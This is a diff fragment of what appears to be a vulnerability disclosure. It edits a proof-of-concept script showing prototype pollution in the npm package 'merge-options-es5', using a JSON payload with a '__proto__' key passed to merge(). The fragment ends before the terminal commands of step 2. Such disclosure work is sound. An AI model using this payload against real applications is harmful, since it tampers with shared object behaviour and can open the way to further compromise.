@@ -9,9 +9,9 @@
 // poc.js
 merge = require('merge-options-es5')
 
-console.log(`Before: ${{}.polluted}`)
+console.log('Before: ', {}.polluted)
 merge({}, JSON.parse('{"__proto__": {"polluted": true}}'))
-console.log(`After: ${{}.polluted}`)
+console.log('After: ', {}.polluted)
 ```
 2. Execute the following commands in the terminal:
 ```bash
